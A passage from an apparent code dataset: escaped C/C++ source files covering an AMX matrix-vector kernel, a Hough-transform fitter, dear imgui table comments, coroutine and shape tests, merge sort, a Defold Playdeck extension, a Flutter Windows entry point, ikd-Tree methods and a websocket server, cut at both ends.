col_tail config\n  int col_tail = M % 16;\n  __tilecfg col_tail_config = {0};\n  {\n    col_tail_config.palette_id = 1;\n    col_tail_config.start_row = 0;\n    // y\n    col_tail_config.rows[0] = col_tail;\n    col_tail_config.colsb[0] = 4;\n    // A\n    col_tail_config.rows[1] = col_tail;\n    col_tail_config.colsb[1] = 64;\n    // x\n    col_tail_config.rows[2] = 16;\n    col_tail_config.colsb[2] = 4;\n  }\n  // init corner config\n  __tilecfg corner_config = {0};\n  {\n    corner_config.palette_id = 1;\n    corner_config.start_row = 0;\n    // y\n    corner_config.rows[0] = col_tail;\n    corner_config.colsb[0] = 4;\n    // A\n    corner_config.rows[1] = col_tail;\n    corner_config.colsb[1] = row_tail * sizeof(BF16);\n    // x\n    corner_config.rows[2] = row_tail / 2;\n    corner_config.colsb[2] = 4;\n  }\n\n  int i, j;\n  for (i = 0; i <= M - 16; i += 16) {\n    _tile_loadconfig(&default_config);\n    _tile_loadd(0, y + i, sizeof(FP32));\n    for (j = 0; j <= N - 32; j += 32) {\n      _tile_loadd(1, A + i * N + j, sizeof(BF16) * N);\n      _tile_loadd(2, x + j, 2 * sizeof(BF16));\n      _tile_dpbf16ps(0, 1, 2);\n    }\n    if (j < N) {\n      // for row tail\n      _tile_stored(0, y + i, sizeof(FP32));\n      _tile_loadconfig(&row_tail_config);\n      _tile_loadd(0, y + i, sizeof(FP32));\n      _tile_loadd(1, A + i * N + j, sizeof(BF16) * N);\n      // if (x_tail == nullptr)\n      _tile_loadd(2, x + j, 2 * sizeof(BF16));\n      // else\n      //   _tile_loadd(2, x_tail, 2 * sizeof(BF16));\n      _tile_dpbf16ps(0, 1, 2);\n    }\n    _tile_stored(0, y + i, sizeof(FP32));\n  }\n  if (i < M) {\n    // for col tail\n    _tile_loadconfig(&col_tail_config);\n    _tile_loadd(0, y + i, sizeof(FP32));\n    for (j = 0; j <= N - 32; j += 32) {\n      _tile_loadd(1, A + i * N + j, sizeof(BF16) * N);\n      _tile_loadd(2, x + j, 2 * sizeof(BF16));\n      _tile_dpbf16ps(0, 1, 2);\n    }\n    if (j < N) {\n      // for corner\n      _tile_stored(0, y + i, sizeof(FP32));\n      _tile_loadconfig(&corner_config);\n      _tile_loadd(0, y + i, sizeof(FP32));\n      _tile_loadd(1, A + i * N + j, sizeof(BF16) * N);\n      // if (x_tail == nullptr) {\n      _tile_loadd(2, x + j, 2 * sizeof(BF16));\n      // } else {\n      //   _tile_loadd(2, x_tail, 2 * sizeof(BF16));\n      // }\n      _tile_dpbf16ps(0, 1, 2);\n      _tile_stored(0, y + i, sizeof(FP32));\n    }\n  }\n}\n\nvoid gemv_tile(BF16* A, BF16* x, FP32* y) {\n  // enable amx\n  if (!enable_amx()) exit(-1);\n  // init config\n  __tilecfg config = {0};\n  {\n    config.palette_id = 1;\n    config.start_row = 0;\n    // y\n    config.rows[0] = 16;\n    config.colsb[0] = 4;\n    // A\n    config.rows[1] = 16;\n    config.colsb[1] = 64;\n    // x\n    config.rows[2] = 16;\n    config.colsb[2] = 4;\n  }\n  _tile_loadconfig(&config);\n  // load\n  _tile_loadd(0, y, 4);\n  _tile_loadd(1, A, 64);\n  _tile_loadd(2, x, 4);\n  // compute\n  _tile_dpbf16ps(0, 1, 2);\n  // store\n  _tile_stored(0, y, 4);\n  _tile_release();\n}\n\nvoid gemv_ref(const int M, const int N, const BF16* A, const BF16* x, FP32* y) {\n  int i, j;\n  for (i = 0; i < M; i++) {\n    FP32 sum = 0.0f;\n    for (j = 0; j < N; j++) {\n      sum += A[i * N + j] * x[j];\n    }\n    y[i] = sum;\n  }\n}\n\n/**\n * Optimized ge",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <cmath>\n#include <vector>\n#include <iomanip>\n\n#define PI 3.14159\nusing namespace std;\n\nint main() {\n\n    int event_num;\n    string filename;\n    cout << \"Input file name (including extension) and event number: \" << endl;\n    cin >> filename >> event_num;\n\n    ofstream datafile(\"24Mg_20Ne_Run7_Slopes_Intercepts.txt\", ios::app);\n    //datafile << \"Event:\" << \"  \" << \"Slope:\" << \"  \" << \"Intercepts:\" << endl;\n\n    ifstream myfile(filename);\n    if (!myfile) {cerr << \"This file does not exist!\" << endl;}\n    \n    vector<float> x_values, y_values, charge;\n    vector<int> pad_num, time_bin;\n    int pad, time;\n    float x_coord, y_coord, q;\n    \n    while (myfile >> x_coord >> y_coord >> time >> pad >> q) {\n\n        x_values.push_back(x_coord);\n        y_values.push_back(y_coord);\n        time_bin.push_back(time);\n        pad_num.push_back(pad);\n        charge.push_back(q);\n    }\n\n    int theta_high, theta_low, increment, bins, difference;\n    cout << \"Input lowest and highest theta values and increment:\" << endl;\n    cin >> theta_low >> theta_high >> increment;\n\n    difference = theta_high - theta_low;\n    bins = difference/increment + 1;\n\n    int rmax = 260 * 2;\n    int accumulator[rmax][bins] = {0};\n    float radians, r_float;\n    float rounded_rfloat;\n\n    for (int i = 0; i < x_values.size(); i++) {\n        for (int j = theta_low; j <= theta_high; j+=increment) {\n            \n                radians = (float)j * PI/180.0;\n                r_float = x_values[i]*cos(radians) + y_values[i]*sin(radians);\n                rounded_rfloat = round(r_float);\n                accumulator[(int)rounded_rfloat + rmax/2][(j-theta_low)/increment] += 1;\n        }\n    }\n    \n    int biggest = accumulator[0][0];\n    float slopes, intercepts, rad, radial_values;\n\n    int num_intersections;\n    float r_int1, r_float1, radians1; \n    int cut_rmax, cut_rmin, cut_theta_max, cut_theta_min;\n\n    cout << \"Define regions of the \\'cut\\' with rmax, rmin, theta max, and theta min (ALL INTEGERS)\" << endl;\n    cin >> cut_rmax >> cut_rmin >> cut_theta_max >> cut_theta_min; // Make this automatic \n\n    for (int i = cut_rmin; i < cut_rmax; i++) {\n        int index_j = 0;\n        \n        for (int j = cut_theta_min; j <= cut_theta_max; j+=increment) {\n            index_j = j/increment;\n            \n            if (accumulator[i][index_j] > 8) {\n                num_intersections = accumulator[i][index_j];\n                \n                if (accumulator[i][index_j] > biggest) {\n                    \n                    biggest = accumulator[i][index_j];\n                    rad = (float)(j + theta_low) * PI/180.0;\n                    radial_values = (float)(i - rmax/2);\n\n                    slopes = -cos(rad)/sin(rad);\n                    intercepts = radial_values/sin(rad);\n                }\n                \n                for (int k = 0; k < x_values.size(); k++) {\n\n                    r_float1 = x_values[k]*cos(rad) + y_values[k]*sin(rad);\n                    r_int1 = round(r_float1);\n                    if (r_int1 <= (float)(i - rmax/2) + 1.0 && r_int1 >= (float)(i - rmax/2) - 1.0) {\n\n                        cout << \"X Values: \" << x_values[k] << \" Y Values: \" << y_values[k] <<\n                        \" Number of Intercepts: \" << num_intersections << endl;\n                    }\n                }\n            }\n        }\n    }\n\n    datafile << event_num << \"  \" << slopes << \"  \" << intercepts << endl;  \n    return 0;\n}",
    "// dear imgui, v1.83 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableDrawContextMenu()                  - draw right-click context menu\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - outer_size.x  > 0.0f  ->  Set Fixed width.",
    "#include <atomic>\n\n#include <gtest/gtest.h>\n#include <coro/coro.hpp>\n#include <cochan/cochan.hpp>\n\ntemplate< class T >\nvoid drop( T t )\n{\n}\n\nclass AwaitableLibcoroTest: public ::testing::Test\n{\n  protected:\n    AwaitableLibcoroTest()\n        : tp( coro::thread_pool::options{ .thread_count = 4 } )\n    {\n    }\n\n    coro::thread_pool tp;\n};\n\nTEST_F( AwaitableLibcoroTest, ReceiverClose )\n{\n    std::atomic_bool stop = false;\n    coro::latch l{ 1 };\n    auto receive = [ & ]( cochan::Receiver< int > receiver ) -> coro::task< void > {\n        while( true )\n        {\n            auto val = co_await receiver.receive();\n            if( !val )\n            {\n                COCHAN_ASSERT( false, \"Shouldn;t be reached\" );\n            }\n\n            if( stop )\n            {\n                drop( std::move( receiver ) );\n                l.count_down();\n                break;\n            }\n        }\n    };\n\n    constexpr uint NUM_OF_SENDS = 237;\n    constexpr uint DROP_AT = 101;\n    auto send = [ & ]( cochan::Sender< int > sender ) -> coro::task< bool > {\n        for( int i = 0; i < NUM_OF_SENDS; i++ )\n        {\n            if( i == DROP_AT )\n            {\n                stop = true;\n            }\n\n            co_await sender.send( i );\n\n            if( i == DROP_AT )\n            {\n                co_await l;\n                break;\n            }\n        }\n\n        try\n        {\n            co_await sender.send( 101 );\n        }\n        catch( cochan::ChannelClosedException& ex )\n        {\n            co_return true;\n        }\n\n        co_return false;\n    };\n\n    auto scheduleFunc = [ this ]( std::coroutine_handle<> handle ) {\n        auto scheduleAwaitable = tp.schedule();\n        scheduleAwaitable.await_suspend( handle );\n    };\n\n    auto task = [ & ]() -> coro::task< uint > {\n        auto [ sender, receiver ] = cochan::makeChannel< int >( 7, scheduleFunc );\n\n        auto sendTask = send( std::move( sender ) );\n        auto receiveTask = receive( std::move( receiver ) );\n        auto [ flag, _ ] = co_await coro::when_all( std::move( sendTask ), std::move( receiveTask ) );\n\n        co_return flag.return_value();\n    };\n\n    auto flag = coro::sync_wait( task() );\n    ASSERT_EQ( flag, true );\n}\n\nint main( int argc, char** argv )\n{\n    ::testing::InitGoogleTest( &argc, argv );\n    return RUN_ALL_TESTS();\n}\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n\r\n\r\nvoid merge(int arr[], int l, int m, int r) {\r\n    int i, j, k;\r\n    int n1 = m - l + 1;\r\n    int n2 = r - m;\r\n\r\n    \r\n    int L[n1], R[n2];\r\n\r\n  \r\n    for (i = 0; i < n1; i++)\r\n        L[i] = arr[l + i];\r\n    for (j = 0; j < n2; j++)\r\n        R[j] = arr[m + 1 + j];\r\n\r\n    \r\n    i = 0; \r\n    j = 0; \r\n    k = l;\r\n    while (i < n1 && j < n2) {\r\n        if (L[i] <= R[j]) {\r\n            arr[k] = L[i];\r\n            i++;\r\n        } else {\r\n            arr[k] = R[j];\r\n            j++;\r\n        }\r\n        k++;\r\n    }\r\n\r\n   \r\n    while (i < n1) {\r\n        arr[k] = L[i];\r\n        i++;\r\n        k++;\r\n    }\r\n\r\n  \r\n    while (j < n2) {\r\n        arr[k] = R[j];\r\n        j++;\r\n        k++;\r\n    }\r\n}\r\n\r\n// Function to implement merge sort\r\nvoid mergeSort(int arr[], int l, int r) {\r\n    if (l < r) {\r\n        \r\n        int m = l + (r - l) / 2;\r\n\r\n        \r\n        mergeSort(arr, l, m);\r\n        mergeSort(arr, m + 1, r);\r\n\r\n       \r\n        merge(arr, l, m, r);\r\n    }\r\n}\r\n\r\n\r\nvoid printArray(int arr[], int size) {\r\n    for (int i = 0; i < size; i++) {\r\n        printf(\"%d \", arr[i]);\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nint main() {\r\n    int n;\r\n    printf(\"Enter the number of elements: \");\r\n    scanf(\"%d\", &n);\r\n\r\n    int arr[n];\r\n    printf(\"Enter %d integers: \", n);\r\n    for (int i = 0; i < n; i++) {\r\n        scanf(\"%d\", &arr[i]);\r\n    }\r\n\r\n    mergeSort(arr, 0, n - 1);\r\n    printf(\"Sorted array: \");\r\n    printArray(arr, n);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "// myextension.cpp\n// Extension lib defines\n#define EXTENSION_NAME playdeck\n#define LIB_NAME \"playdeck\"\n#define MODULE_NAME \"playdeck\"\n// include the Defold SDK\n#include <dmsdk/sdk.h>\n\n\ninline void check_table(lua_State *L, int index) {\n \n}\n\n\n#if defined(DM_PLATFORM_HTML5)\n\ntypedef void (*PlaydeckCallback)(const char *data, const int length);\n\nextern \"C\" void HtmlPlaydeckRegisterCallback(PlaydeckCallback callback);\nextern \"C\" void HtmlPlaydeckGetUserProfile();\nextern \"C\" void HtmlPlaydeckSetDataString(const char *key, const char *value);\nextern \"C\" void HtmlPlaydeckSetDataBoolean(const char *key, int value);\nextern \"C\" void HtmlPlaydeckSetDataNumber(const char *key, float value);\nextern \"C\" void HtmlPlaydeckGetData(const char *key);\nextern \"C\" void HtmlPlaydeckCustomShare(const char *jsonStr);\nextern \"C\" void HtmlPlaydeckGetShareLink(const char *jsonStr);\nextern \"C\" void HtmlPlaydeckOpenTelegramLink(const char *url);\nextern \"C\" void HtmlPlaydeckGetPlaydeckState();\nextern \"C\" void HtmlPlaydeckGameEnd();\nextern \"C\" void HtmlPlaydeckSendGameProgress(const char *jsonStr);\nextern \"C\" void HtmlPlaydeckSendAnalyticNewSession();\nextern \"C\" void HtmlPlaydeckSendAnalytics(const char *jsonStr);\nextern \"C\" void HtmlPlaydeckSendAnalyticsInternalError(const char *errorStr);\nextern \"C\" void HtmlPlaydeckRequestPayment(const char *jsonStr);\nextern \"C\" void HtmlPlaydeckGetPaymentInfo(const char *jsonStr);\nextern \"C\" void HtmlPlaydeckGetToken();\nextern \"C\" void HtmlPlaydeckShowAd();\nextern \"C\" void HtmlPlaydeckLoading(float value);\n\ninline void convert_lua_table_to_json(lua_State *L, int index, char** json, size_t* json_length) {\n    if (!lua_istable(L, index)) {\n        luaL_error(L, \"Expected table but got %s\", luaL_typename(L, index));\n    }\n    int ret = dmScript::LuaToJson(L, json, json_length);\n    if (ret != 0) {\n        luaL_error(L, \"Failed to convert lua table to json: %s\", lua_tostring(L, -1));\n    }\n}\n\n\nstruct PlaydeckListener {\n    PlaydeckListener() : m_L(0), m_Callback(LUA_NOREF), m_Self(LUA_NOREF) {}\n    lua_State *m_L;\n    int m_Callback;\n    int m_Self;\n\n    // Member function to check if callback and instance are valid\n    bool checkCallbackAndInstance() {\n        if (m_Callback == LUA_NOREF) {\n            dmLogInfo(\"PlaydeckListener callback does not exist.\");\n            return false;\n        }\n\n        lua_State *L = m_L;\n        int top = lua_gettop(L);\n        lua_rawgeti(L, LUA_REGISTRYINDEX, m_Callback); // [-1] - callback\n        lua_rawgeti(L, LUA_REGISTRYINDEX, m_Self);     // [-1] - self, [-2] - callback\n        lua_pushvalue(L, -1);                          // [-1] - self, [-2] - self, [-3] - callback\n        dmScript::SetInstance(L);                      // [-1] - self, [-2] - callback\n\n        if (!dmScript::IsInstanceValid(L)) {\n            unregisterCallback();\n            dmLogError(\"Could not run PlaydeckListener callback because the instance has been deleted.\");\n            lua_pop(L, 2);\n            assert(top == lua_gettop(L));\n            return false;\n        }\n        return true;\n    }\n\n    // Instance method to unregister a callback\n    void unregisterCallback() {\n        if (m_Callback != LUA_NOREF) {\n            dmScript::Unref(m_L, LUA_REGISTRYINDEX, m_Callback);\n            dmScript::Unref(m_L, LUA_REGISTRYINDEX, m_Self);\n            m_Callback = LUA_NOREF;\n            m_Self = LUA_NOREF;\n        } else {\n            dmLogError(\"Can't remove a callback that was not registered.\");\n        }\n    }\n\n} PLAYDECK_LISTENER;\n\nstatic void JsPlaydeck_Callback(const char *data, const int length) {\n    lua_State *L = PLAYDECK_LISTENER.m_L;\n    int top = lua_gettop(L);\n    if (PLAYDECK_LISTENER.checkCallbackAndInstance()) {\n        //[-1] - self [-2] - callback\n        dmScript::JsonToLua(L, data, length); // throws lua error if it fails\n        //[-1] result lua table, [-2] self, [-3] callback\n        int ret = lua_pcall(L, 2, 0, 0);\n        if (ret != 0) {\n            dmLogError(\"Error running callback: %s\", lua_tostring(L, -1));\n            lua_pop(L, 1);\n        }\n    }\n    assert(top == lua_gettop(L));\n}\n\nstatic int LuaPlaydeckRegisterCallback(lua_State *L) {\n    int type = lua_type(L, 1);\n    if (type != LUA_TFUNCTION) {\n        luaL_error(L, \"Playdeck callback is invalid. Use callback function as an argument\");\n        return 0;\n    }\n\n    if (PLAYDECK_LISTENER.m_Callback != LUA_NOREF) {\n        return luaL_error(L, \"PlaydeckSDK callback already exist.\");\n    }\n\n    lua_pushvalue(L, 1);\n    PLAYDECK_LISTENER.m_Callback = dmScript::Ref(L, LUA_REGISTRYINDEX);\n\n    dmScript::GetInstance(L);\n    PLAYDECK_LISTENER.m_Self = dmScript::Ref(L, LUA_REGISTRYINDEX);\n\n    HtmlPlaydeckRegisterCallback((PlaydeckCallback)JsPlaydeck_Callback);\n    return 0;\n}\n\nstatic int LuaPlaydeckGetUserProfile(lua_State *L) {\n    HtmlPlaydeckGetUserProfile();\n    return 0;\n}\n\nstatic int LuaPlaydeckSetData(lua_State *L) {\n    const char *key = luaL_checkstring(L, 1);\n    if (lua_isstring(L, 2)) {\n        HtmlPlayde",
    "//#pragma once\n\n//#include <gtest/gtest.h>\n//#include \"myshape.h\"\n//#include \"myrect.h\"\n//#include \"mytext.h\"\n\n//TEST(kososhapeTestCase, kososhapeTest) {\n//    MyShape *test = new MyRect();\n//    MyText *test01 = new MyText();\n//    //test func setStart()\u3001getStart()\u3001setEnd()\u3001getEnd()\n//    QPoint testPoint(10,20);\n//    test->setStart(testPoint);\n//    test01->setEnd(testPoint);\n//    bool startFlag = testPoint == test->getStart() ? true : false;\n//    ASSERT_TRUE(startFlag);\n//    bool endFlag = testPoint == test01->getEnd() ? true : false;\n//    ASSERT_TRUE(endFlag);\n\n//    //test func dragMove()\n//    int x = 10, y = 20;\n//    QPoint startPoint = test->getStart();\n//    test->dragMove(QPoint(0,0),QPoint(x,y));\n//    QPoint endPoint = test->getStart();\n//    EXPECT_EQ(x, (endPoint.x() - startPoint.x()));\n//    EXPECT_EQ(y, (endPoint.y() - startPoint.y()));\n//    //test func isSeclect()\n//    test->setStart(QPoint(0,0));\n//    test->setEnd(QPoint(10,10));\n//    EXPECT_FALSE(test->isSeclect(QPoint(5,20)));\n//    EXPECT_TRUE(test->isSeclect(QPoint(5,5)));\n//    //test func zoomChange()\n//    int zoomInt = 2;\n//    testPoint = test->getEnd();\n//    test->zoomChange(zoomInt);\n//    EXPECT_TRUE(test->getEnd() == testPoint * zoomInt);\n//    //test func zoomShape()\n//    test01->setStart(QPoint(0,0));\n//    test01->setEnd(QPoint(10,10));\n//    testPoint = test01->getStart();\n//    test01->zoomShape(zoomInt);\n//    EXPECT_TRUE(test01->getStart() == testPoint * zoomInt);\n//    delete test;\n//    delete test01;\n//}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"animatedbottomavigationbar\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ikd_Tree.h\"\n\n/*\nDescription: ikd-Tree: an incremental k-d tree for robotic applications\nAuthor: Yixi Cai\nemail: yixicai@connect.hku.hk\n*/\n\ntemplate <typename PointType>\nKD_TREE<PointType>::KD_TREE(float delete_param, float balance_param, float box_length)\n{\n    delete_criterion_param = delete_param;\n    balance_criterion_param = balance_param;\n    downsample_size = box_length;\n    Rebuild_Logger.clear();\n    termination_flag = false;\n    start_thread();\n}\n\ntemplate <typename PointType>\nKD_TREE<PointType>::~KD_TREE()\n{\n    stop_thread();\n    Delete_Storage_Disabled = true;\n    delete_tree_nodes(&Root_Node);\n    PointVector().swap(PCL_Storage);\n    Rebuild_Logger.clear();\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::InitializeKDTree(float delete_param, float balance_param, float box_length)\n{\n    Set_delete_criterion_param(delete_param);\n    Set_balance_criterion_param(balance_param);\n    set_downsample_param(box_length);\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::InitTreeNode(KD_TREE_NODE *root)\n{\n    root->point.x = 0.0f;\n    root->point.y = 0.0f;\n    root->point.z = 0.0f;\n    root->node_range_x[0] = 0.0f;\n    root->node_range_x[1] = 0.0f;\n    root->node_range_y[0] = 0.0f;\n    root->node_range_y[1] = 0.0f;\n    root->node_range_z[0] = 0.0f;\n    root->node_range_z[1] = 0.0f;\n    root->radius_sq = 0.0f;\n    root->division_axis = 0;\n    root->father_ptr = nullptr;\n    root->left_son_ptr = nullptr;\n    root->right_son_ptr = nullptr;\n    root->TreeSize = 0;\n    root->invalid_point_num = 0;\n    root->down_del_num = 0;\n    root->point_deleted = false;\n    root->tree_deleted = false;\n    root->need_push_down_to_left = false;\n    root->need_push_down_to_right = false;\n    root->point_downsample_deleted = false;\n    root->working_flag = false;\n    pthread_mutex_init(&(root->push_down_mutex_lock), NULL);\n}\n\ntemplate <typename PointType>\nint KD_TREE<PointType>::size()\n{\n    int s = 0;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n        {\n            return Root_Node->TreeSize;\n        }\n        else\n        {\n            return 0;\n        }\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            s = Root_Node->TreeSize;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return s;\n        }\n        else\n        {\n            return Treesize_tmp;\n        }\n    }\n}\n\ntemplate <typename PointType>\nBoxPointType KD_TREE<PointType>::tree_range()\n{\n    BoxPointType range;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n        {\n            range.vertex_min[0] = Root_Node->node_range_x[0];\n            range.vertex_min[1] = Root_Node->node_range_y[0];\n            range.vertex_min[2] = Root_Node->node_range_z[0];\n            range.vertex_max[0] = Root_Node->node_range_x[1];\n            range.vertex_max[1] = Root_Node->node_range_y[1];\n            range.vertex_max[2] = Root_Node->node_range_z[1];\n        }\n        else\n        {\n            memset(&range, 0, sizeof(range));\n        }\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            range.vertex_min[0] = Root_Node->node_range_x[0];\n            range.vertex_min[1] = Root_Node->node_range_y[0];\n            range.vertex_min[2] = Root_Node->node_range_z[0];\n            range.vertex_max[0] = Root_Node->node_range_x[1];\n            range.vertex_max[1] = Root_Node->node_range_y[1];\n            range.vertex_max[2] = Root_Node->node_range_z[1];\n            pthread_mutex_unlock(&working_flag_mutex);\n        }\n        else\n        {\n            memset(&range, 0, sizeof(range));\n        }\n    }\n    return range;\n}\n\ntemplate <typename PointType>\nint KD_TREE<PointType>::validnum()\n{\n    int s = 0;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n            return (Root_Node->TreeSize - Root_Node->invalid_point_num);\n        else\n            return 0;\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            s = Root_Node->TreeSize - Root_Node->invalid_point_num;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return s;\n        }\n        else\n        {\n            return -1;\n        }\n    }\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::root_alpha(float &alpha_bal, float &alpha_del)\n{\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        alpha_bal = Root_Node->alpha_bal;\n        alpha_del = Root_Node->alpha_del;\n        return;\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            alpha_bal = Root_Node->alpha_bal;\n            alpha_del = Root_Node->alpha_del;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return;\n        }\n        else\n        {\n            alpha_bal = alpha_bal_tmp;\n            alpha_del = alpha_del_tmp;\n            r",
    "#include \"WebsocketServer.h\"\r\n#include \"Support.h\"\r\n#include \"localserver.h\"\r\n#include <ixwebsocket/IXNetSystem.h>\r\n#include <ixwebsocket/IXWebSocket.h>\r\n#include <ixwebsocket/IXWebSocketServer.h>\r\n#include <ixwebsocket/IXUserAgent.h>\r\n#include <functional>\r\n#include <cassert>\r\n#include <cstdio>\r\n#include <cstring>\r\n#include <string_view>\r\n\r\nvoid OnFatalError();\r\n\r\nWebsocketServer::WebsocketServer()\r\n{\r\n\tm_localServer.reset(new LocalServer);\r\n\tm_server.reset(new ix::WebSocketServer(port));\r\n\tm_tls.reset(new ix::SocketTLSOptions());\r\n\tm_tls->tls = true;\r\n\r\n\tif (!m_tls->isValid())\r\n\t{\r\n\t\tfprintf(stderr, \"TLS configuration is not valid: %s\\n\", m_tls->getErrorMsg().c_str());\r\n\t\tm_tls.reset();\r\n\t}\r\n\r\n\tm_server->setOnConnectionCallback(std::bind(&WebsocketServer::OnConnection, this, std::placeholders::_1, std::placeholders::_2));\r\n\r\n\tauto res = m_server->listen();\r\n\tif (!res.first)\r\n\t{\r\n\t\t// Error handling\r\n\t\tfprintf(stderr, \"Server Creation Error: %s local networking will not be possible.\\n\", res.second.c_str());\r\n\t\tm_server.reset();\r\n\t\tOnFatalError();\r\n\t\treturn;\r\n\t}\r\n\r\n\t// Per message deflate connection is enabled by default. It can be disabled\r\n\t// which might be helpful when running on low power devices such as a Rasbery Pi\r\n\tm_server->disablePerMessageDeflate();\r\n\r\n\t// Run the server in the background. Server can be stoped by calling server.stop()\r\n\tm_server->start();\r\n\r\n\tauto url = m_server->getHost();\r\n\tfprintf(stdout, \"Opened websocket server %s:%d\\n\", url.c_str(), m_server->getPort());\r\n}\r\n\r\nWebsocketServer::~WebsocketServer()\r\n{\r\n\t_clients.clear();\r\n\r\n\tif (m_server)\r\n\t\tm_server->stop();\r\n}\r\n\r\nvoid WebsocketServer::OnGameOpened(SharedMemoryInterface* _interface)\r\n{\r\n\tm_localServer->OnGameOpened(_interface);\r\n\r\n\tstd::lock_guard lock(_mutex);\r\n\tassert(this->_interface == nullptr);\r\n\tthis->_interface = _interface;\r\n\r\n\tchar buffer[256];\r\n\tsnprintf(buffer, sizeof(buffer), \"%s %s %d.%d %s\", \"OnGameOpened\", _interface->_engine.c_str(), _interface->versionMajor, 